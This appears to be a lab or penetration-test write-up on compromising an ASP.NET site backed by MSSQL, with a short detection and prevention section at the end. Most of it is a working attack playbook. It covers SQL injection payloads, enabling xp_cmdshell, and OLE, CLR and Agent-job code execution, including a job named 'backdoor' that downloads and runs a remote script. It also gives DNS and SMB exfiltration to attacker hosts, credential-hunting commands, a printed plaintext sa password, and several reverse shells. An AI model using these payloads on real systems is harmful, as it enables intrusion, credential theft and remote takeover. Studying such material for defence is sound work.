# VULNERABILITY RESEARCH - OFFSECATK.COM

**Target:** http://offsecatk.com (192.168.145.50)
**Research Date:** 2025-10-03
**Focus:** Manual discovery techniques, MSSQL exploitation, ASP.NET security

---

## VULNERABILITY CLASSIFICATION

### Primary Vulnerability: SQL Injection

**CWE Classification:**
- **CWE-89:** SQL Injection
- **CWE-209:** Information Exposure Through Error Messages
- **CWE-250:** Execution with Unnecessary Privileges

**OWASP Top 10:**
- **A03:2021 – Injection**

**CVSS Score (Estimated):**
- Base Score: 9.8 (Critical)
- Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**Breakdown:**
- AV:N (Network): Exploitable remotely
- AC:L (Low): No special conditions required
- PR:N (None): No authentication needed
- UI:N (None): No user interaction
- S:U (Unchanged): Scope limited to vulnerable component
- C:H (High): Full confidentiality compromise
- I:H (High): Full integrity compromise
- A:H (High): Full availability compromise

---

## MANUAL DISCOVERY METHODOLOGY

### Step 1: Input Field Identification

**Reconnaissance:**
```bash
# View page source
curl -s http://offsecatk.com/login.aspx | grep -i input

# Identify form fields:
# - ctl00$ContentPlaceHolder1$UsernameTextBox
# - ctl00$ContentPlaceHolder1$PasswordTextBox
# - ctl00$ContentPlaceHolder1$LoginButton (submit)
# - __VIEWSTATE (ASP.NET state management)
# - __VIEWSTATEGENERATOR
# - __EVENTVALIDATION
```

**ASP.NET Indicators:**
- Form field naming: `ctl00$ContentPlaceHolder1$[Control]`
- ViewState presence (Base64 encoded data)
- `.aspx` file extension
- Event validation tokens

**Why This Matters:**
- ASP.NET typically uses MSSQL backend
- ViewState required for all POST requests
- Field naming suggests server-side controls
- Validation tokens may need to be included

---

### Step 2: SQL Injection Testing - Basic Payloads

**Single Quote Test:**
```bash
# Payload: '
# Purpose: Break SQL syntax
# Expected: SQL error or different behavior

curl -X POST http://offsecatk.com/login.aspx \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox='" \
  [other required fields]

# Response: SQL error message
# Conclusion: SQL injection confirmed
```

**Why Single Quote Works:**
```sql
-- Original query (presumed)
SELECT * FROM users WHERE username = 'INPUT' AND password = 'PASS'

-- With single quote payload
SELECT * FROM users WHERE username = ''' AND password = 'PASS'
                                    ↑
                                Unmatched quote = syntax error
```

---

**Boolean-Based Tests:**
```bash
# Test 1: Always true condition
Username: admin' OR 1=1--
# SQL: WHERE username = 'admin' OR 1=1--' AND password = 'PASS'
# Result: Returns rows if injection works

# Test 2: Always false condition
Username: admin' AND 1=2--
# SQL: WHERE username = 'admin' AND 1=2--' AND password = 'PASS'
# Result: Returns no rows

# Test 3: Comparison
Username: admin' OR 'a'='a'--
# SQL: WHERE username = 'admin' OR 'a'='a'--' AND password = 'PASS'
# Result: Always true
```

**How to Identify Success:**
- Different response sizes
- Different response times
- Different error messages
- Login success vs failure

---

### Step 3: Database Fingerprinting

**MSSQL-Specific Syntax:**
```bash
# Test 1: Comment style
admin'--
# MSSQL uses -- for comments

# Test 2: String concatenation
admin' + 'test'--
# MSSQL uses + for concatenation

# Test 3: Version function
admin' AND @@version IS NOT NULL--
# @@version is MSSQL-specific

# Test 4: Time delay
admin'; WAITFOR DELAY '00:00:05'--
# WAITFOR DELAY is MSSQL-only
```

**Other Databases for Comparison:**

**MySQL:**
```sql
# Comment: #
admin'#

# Concatenation: CONCAT()
admin' AND CONCAT('a','b')='ab'#

# Time delay: SLEEP()
admin'; SELECT SLEEP(5)#
```

**PostgreSQL:**
```sql
# Comment: --
admin'--

# Concatenation: ||
admin' || 'test'--

# Time delay: pg_sleep()
admin'; SELECT pg_sleep(5)--
```

**Oracle:**
```sql
# Comment: --
admin'--

# Concatenation: ||
admin' || 'test'--

# Time delay: DBMS_LOCK.SLEEP()
admin'; BEGIN DBMS_LOCK.SLEEP(5); END;--
```

**Fingerprinting Decision Tree:**
```
SQL Error? → Yes → SQL Injection likely
    ↓
Test WAITFOR DELAY (5s)
    ↓ Delays 5s
MSSQL confirmed
    ↓ No delay
Test SLEEP(5)
    ↓ Delays 5s
MySQL confirmed
    ↓ No delay
Test pg_sleep(5)
    ↓ Delays 5s
PostgreSQL confirmed
```

---

### Step 4: Union-Based Injection Discovery

**Column Count Enumeration:**
```bash
# Method 1: ORDER BY
admin' ORDER BY 1--   # Success
admin' ORDER BY 2--   # Success
admin' ORDER BY 3--   # Error

# Conclusion: Query has 2 columns
```

**Why ORDER BY Works:**
```sql
-- Original query returns 2 columns
SELECT username, password FROM users WHERE username = 'admin' ORDER BY 2--'

-- ORDER BY 3 fails
SELECT username, password FROM users WHERE username = 'admin' ORDER BY 3--'
                                                                      ↑
                                                         Column 3 doesn't exist
```

**UNION SELECT Testing:**
```bash
# Test with matching column count
admin' UNION SELECT NULL,NULL--

# Success? → UNION injection possible
# Error? → Wrong column count or data type mismatch
```

**Data Extraction Example:**
```bash
# Extract current user and database
admin' UNION SELECT SYSTEM_USER,DB_NAME()--

# Response should show:
# Username: sa (from SYSTEM_USER)
# Password: webapp (from DB_NAME())
```

---

### Step 5: Stacked Query Detection

**Single Statement Test:**
```bash
admin'; SELECT 1;--
# Does this execute without error? → Stacked queries work
```

**Multi-Statement Test:**
```bash
admin'; DECLARE @x INT; SET @x = 1; SELECT @x;--
# Multiple statements in sequence
```

**Time-Based Confirmation:**
```bash
admin'; WAITFOR DELAY '00:00:05'; SELECT 1;--
# Delay + additional query
# If both execute → stacked queries confirmed
```

**Why This Is Critical:**
- Stacked queries = arbitrary SQL execution
- Can run administrative commands
- Can modify server configuration
- Enables privilege escalation paths

---

## MSSQL EXPLOITATION TECHNIQUES

### Technique 1: xp_cmdshell - Extended Stored Procedure

**What Is xp_cmdshell?**
- Built-in MSSQL stored procedure
- Executes operating system commands
- Returns output as table rows
- Disabled by default (since SQL Server 2005)
- Requires sysadmin privileges

**How to Enable (Manual):**
```sql
-- Step 1: Enable advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Step 2: Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Why Two Steps?**
- `xp_cmdshell` is an "advanced option"
- Advanced options hidden by default
- Must enable visibility first
- Then enable specific feature
- RECONFIGURE applies changes immediately

**Command Execution Syntax:**
```sql
-- Basic command
EXEC xp_cmdshell 'whoami';

-- With output redirection
EXEC master..xp_cmdshell 'whoami > C:\output.txt';

-- PowerShell execution
EXEC xp_cmdshell 'powershell -c Get-Process';
```

**Privilege Context:**
- Commands execute as SQL Server service account
- Typically: `NT Service\MSSQL$[INSTANCE]`
- Not SYSTEM, not Administrator
- Limited but functional privileges

---

### Technique 2: Output Exfiltration Methods

**Method 1: File Write + HTTP Retrieval**
```sql
EXEC xp_cmdshell 'whoami > C:\inetpub\wwwroot\out.txt';
```
```bash
curl http://target/out.txt
```

**Advantages:**
- Simple and reliable
- Works with any command output
- HTTP GET is low-profile

**Requirements:**
- Web root writable
- IIS serves file type
- Attacker can reach web server

---

**Method 2: DNS Exfiltration**
```sql
EXEC xp_cmdshell 'nslookup [DATA].attacker.com';
```

**How It Works:**
1. Command output captured in variable
2. Encoded into subdomain
3. DNS query to attacker domain
4. Attacker's DNS server logs query
5. Decode subdomain to retrieve data

**Advantages:**
- Works through strict firewalls
- DNS rarely blocked
- No inbound connection needed

**Disadvantages:**
- Requires attacker-controlled DNS server
- Limited data length (255 chars per label)
- Requires encoding/chunking for large data

---

**Method 3: SMB Exfiltration**
```sql
EXEC xp_cmdshell 'copy C:\sensitive.txt \\attacker-ip\share\';
```

**Requirements:**
- SMB outbound allowed (port 445)
- Attacker runs SMB server (impacket-smbserver)
- Credentials may be captured (NTLM hash)

**Setup:**
```bash
# Attacker machine
impacket-smbserver share /tmp/loot -smb2support
```

---

**Method 4: Database Storage**
```sql
-- Create table
CREATE TABLE output (line VARCHAR(8000));

-- Insert command output
INSERT INTO output EXEC xp_cmdshell 'whoami';

-- Extract via SQL injection
admin' UNION SELECT line,NULL FROM output--
```

**Advantages:**
- No file system access required
- No network exfiltration
- Pure SQL channel

---

### Technique 3: Alternative RCE Methods (If xp_cmdshell Fails)

**Option 1: OLE Automation**
```sql
-- Enable OLE Automation
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

-- Execute command via WScript.Shell
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c whoami > C:\out.txt';
```

**Why This Works:**
- OLE objects can interact with OS
- WScript.Shell provides command execution
- Alternative when xp_cmdshell disabled
- Same privilege requirements (sysadmin)

---

**Option 2: SQL Server Agent Jobs**
```sql
-- Create job
EXEC msdb.dbo.sp_add_job @job_name = 'backdoor';

-- Add job step with command
EXEC msdb.dbo.sp_add_jobstep
  @job_name = 'backdoor',
  @step_name = 'step1',
  @subsystem = 'CmdExec',
  @command = 'powershell -c IEX(New-Object Net.WebClient).DownloadString("http://attacker/shell.ps1")';

-- Add job schedule
EXEC msdb.dbo.sp_add_jobschedule @job_name = 'backdoor', @name = 'now';

-- Start job
EXEC msdb.dbo.sp_start_job 'backdoor';
```

**Requirements:**
- SQL Server Agent service running
- sysadmin role
- Job execution may be delayed

---

**Option 3: CLR Assembly Execution**
```sql
-- Enable CLR
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;

-- Create assembly from DLL (base64 or hex)
CREATE ASSEMBLY [malicious] FROM 0x[HEX_OF_DLL] WITH PERMISSION_SET = UNSAFE;

-- Create function from assembly
CREATE PROCEDURE [dbo].[RunCmd] @cmd NVARCHAR(4000) AS EXTERNAL NAME [malicious].[StoredProcedures].[RunCmd];

-- Execute
EXEC dbo.RunCmd 'whoami';
```

**Complexity:**
- Requires .NET DLL creation
- More complex than xp_cmdshell
- Harder to detect (custom code)
- Useful when stored procedures disabled

---

## ASP.NET SECURITY RESEARCH

### Common ASP.NET Vulnerabilities

**1. ViewState Deserialization (CVE-2017-9248)**
- Encrypted ViewState can be compromised
- If machineKey is leaked/weak
- Leads to deserialization attacks
- RCE possible via crafted ViewState

**Not Exploited Here Because:**
- SQL injection was easier
- ViewState encryption not the focus
- Direct database access available

---

**2. web.config Exposure**
- Contains database connection strings
- May contain machineKey
- Should NEVER be web-accessible
- Often contains plaintext credentials

**How We Exploited This:**
```bash
# Read via command execution
EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config > C:\inetpub\wwwroot\webconfig.txt';

# Retrieve
curl http://target/webconfig.txt
```

**Extracted:**
```xml
<connectionString>
  server=localhost\SQLEXPRESS;
  database=webapp;
  uid=sa;
  password=WhileChirpTuesday218;
</connectionString>
```

---

**3. Excessive Database Privileges**
- Application should use **least privilege account**
- Should only have db_reader, db_writer roles
- Should NOT be db_owner or sysadmin
- This application: **Connected as sa** ❌

**Impact of sa Connection:**
- Full server configuration control
- Can enable xp_cmdshell
- Can read/write any database
- Can execute OS commands
- Game over for security

---

## CREDENTIAL HARVESTING RESEARCH

### Windows Credential Locations

**1. Configuration Files**
- `web.config` (ASP.NET)
- `appsettings.json` (.NET Core)
- `app.config` (Windows apps)
- `unattend.xml` (Windows installation)

**2. Registry Keys**
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
- `HKCU\Software\[Application]\Credentials`

**3. File System Locations**
- `C:\inetpub\wwwroot\` (web roots)
- `C:\Windows\Panther\` (unattend.xml)
- `C:\Users\[user]\AppData\` (application data)
- `C:\ProgramData\` (shared application data)

**4. Databases**
- User tables (password hashes)
- Configuration tables
- Stored procedures with embedded creds

**5. Memory**
- Credential Manager (cmdkey /list)
- LSASS process (mimikatz)
- PowerShell history

---

### Manual Credential Enumeration Commands

**Via xp_cmdshell:**
```sql
-- Search for config files
EXEC xp_cmdshell 'dir C:\ /s /b | findstr /i ".config"';

-- Search for password strings
EXEC xp_cmdshell 'findstr /si "password" C:\inetpub\wwwroot\*.config';

-- Check registry autologon
EXEC xp_cmdshell 'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"';

-- List saved credentials
EXEC xp_cmdshell 'cmdkey /list';

-- Check for unattend.xml
EXEC xp_cmdshell 'dir C:\Windows\Panther\unattend.xml';
```

---

## REVERSE SHELL TECHNIQUES

### PowerShell Reverse Shell Research

**Why PowerShell?**
- Pre-installed on Windows
- Full scripting capabilities
- .NET framework access
- Network socket support
- Bypasses many AV solutions (if obfuscated)

**Basic PowerShell TCP Reverse Shell:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

**Breaking Down The Code:**

1. **TCP Connection:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.45.179",4444);
# Creates TCP connection to attacker
```

2. **Network Stream:**
```powershell
$stream = $client.GetStream();
# Gets network stream for read/write
```

3. **Byte Buffer:**
```powershell
[byte[]]$bytes = 0..65535|%{0};
# Creates 65536-byte buffer for receiving data
```

4. **Command Loop:**
```powershell
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
# Reads from attacker until connection closes
```

5. **Command Execution:**
```powershell
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
# Converts bytes to string
$sendback = (iex $data 2>&1 | Out-String );
# Executes command (iex = Invoke-Expression)
# 2>&1 = redirect errors to output
```

6. **Response Formatting:**
```powershell
$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
# Adds PowerShell prompt with current directory
```

7. **Send Response:**
```powershell
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
# Sends output back to attacker
```

---

### Base64 Encoding for Command Line Execution

**Why Base64?**
- Avoids quote escaping issues
- Bypasses command line parsing problems
- Hides payload from casual inspection
- PowerShell supports direct base64 execution

**Encoding Process:**
```bash
# 1. Write PowerShell script to file
echo 'POWERSHELL_CODE' > shell.ps1

# 2. Convert to UTF-16LE (PowerShell requirement)
iconv -t UTF-16LE shell.ps1 > shell_utf16.txt

# 3. Base64 encode
base64 -w 0 shell_utf16.txt > shell_b64.txt

# 4. Use in command
powershell -EncodedCommand [BASE64_CONTENT]
# OR
powershell -e [BASE64_CONTENT]
```

**Execution via xp_cmdshell:**
```sql
EXEC xp_cmdshell 'powershell -e [BASE64_PAYLOAD]';
```

---

### Alternative Reverse Shell Methods

**1. Netcat (if available):**
```bash
nc.exe -e cmd.exe ATTACKER_IP 4444
```

**2. Ncat with SSL:**
```bash
ncat --ssl -e cmd.exe ATTACKER_IP 4444
```

**3. Metasploit Payload:**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.179 LPORT=4444 -f exe > shell.exe
# Upload via certutil or PowerShell download
# Execute via xp_cmdshell
```

**4. Python (if installed):**
```python
python -c 'import socket,subprocess;s=socket.socket();s.connect(("ATTACKER_IP",PORT));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

---

## DETECTION AND PREVENTION RESEARCH

### How to Detect This Attack

**1. SQL Injection Detection:**
- WAF rules for SQL keywords (SELECT, UNION, WAITFOR)
- Error message monitoring
- Response time anomalies (time-based SQLi)
- Query logging and analysis

**2. xp_cmdshell Monitoring:**
- Alert on sp_configure changes
- Monitor xp_cmdshell enablement
- Log all xp_cmdshell executions
- Baseline expected vs unexpected commands

**3. File System Monitoring:**
- Alert on web root modifications
- Monitor config file access (web.config)
- Track file creation in system directories

**4. Network Monitoring:**
- Detect unusual outbound connections
- Monitor PowerShell network activity
- Alert on connections to non-standard ports

**5. Process Monitoring:**
- SQL Server spawning cmd.exe/powershell.exe
- Unexpected child processes of sqlservr.exe
- PowerShell execution with network sockets

---

### Prevention Mechanisms

**1. Input Validation:**
```csharp
// BAD - Vulnerable code
string query = "SELECT * FROM users WHERE username = '" + userInput + "'";

// GOOD - Parameterized query
SqlCommand cmd = new SqlCommand("SELECT * FROM users WHERE username = @username", conn);
cmd.Parameters.AddWithValue("@username", userInput);
```

**2. Least Privilege Database Account:**
```sql
-- Create limited user
CREATE LOGIN webapp_user WITH PASSWORD = 'StrongPassword123!';
CREATE USER webapp_user FOR LOGIN webapp_user;

-- Grant only necessary permissions
ALTER ROLE db_datareader ADD MEMBER webapp_user;
ALTER ROLE db_datawriter ADD MEMBER webapp_user;

-- DO NOT grant:
-- - sysadmin role
-- - db_owner role
-- - CONTROL SERVER permission
```

**3. Disable xp_cmdshell Permanently:**
```sql
-- Disable
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;

-- Remove from server (advanced)
EXEC sp_dropextendedproc 'xp_cmdshell';
```

**4. Web.config Protection:**
```xml
<!-- IIS configuration to block web.config access -->
<configuration>
  <system.webServer>
    <security>
      <requestFiltering>
        <hiddenSegments>
          <add segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

**5. Network Segmentation:**
- Database server on isolated VLAN
- No direct internet access from DB server
- Whitelist only necessary outbound connections
- Firewall between web and database tiers

---

## REFERENCES & FURTHER READING

### Official Documentation
- Microsoft SQL Server Security: https://docs.microsoft.com/en-us/sql/relational-databases/security/
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- ASP.NET Security: https://docs.microsoft.com/en-us/aspnet/core/security/

### Exploitation Techniques
- SQLMap Documentation: https://sqlmap.org/
- NetSPI SQL Injection Wiki: https://sqlwiki.netspi.com/
- PayloadsAllTheThings SQLi: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

### Reverse Shells
- Reverse Shell Cheat Sheet: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- PowerShell Reverse Shells: https://www.revshells.com/

---

## MANUAL DISCOVERY CHECKLIST

**For Future Engagements:**

- [ ] Identify all input fields (GET/POST parameters)
- [ ] Test for SQL injection (single quote, time delays)
- [ ] Fingerprint database (MSSQL, MySQL, PostgreSQL, Oracle)
- [ ] Determine column count (ORDER BY or UNION)
- [ ] Test for stacked queries (semicolon separation)
- [ ] Enumerate database structure (tables, columns)
- [ ] Search for credentials (config files, database tables)
- [ ] Test for command execution (xp_cmdshell, OLE, etc.)
- [ ] Establish persistent access (reverse shell, backdoor)
- [ ] Document all findings and create clean-up plan

**Time Estimates (Manual):**
- SQL injection discovery: 5-10 minutes
- Database fingerprinting: 2-5 minutes
- Stacked query testing: 2-3 minutes
- xp_cmdshell enablement: 1-2 minutes
- Command execution verification: 2-5 minutes
- Credential harvesting: 5-10 minutes
- Reverse shell: 5-10 minutes

**Total: 22-45 minutes for complete compromise**
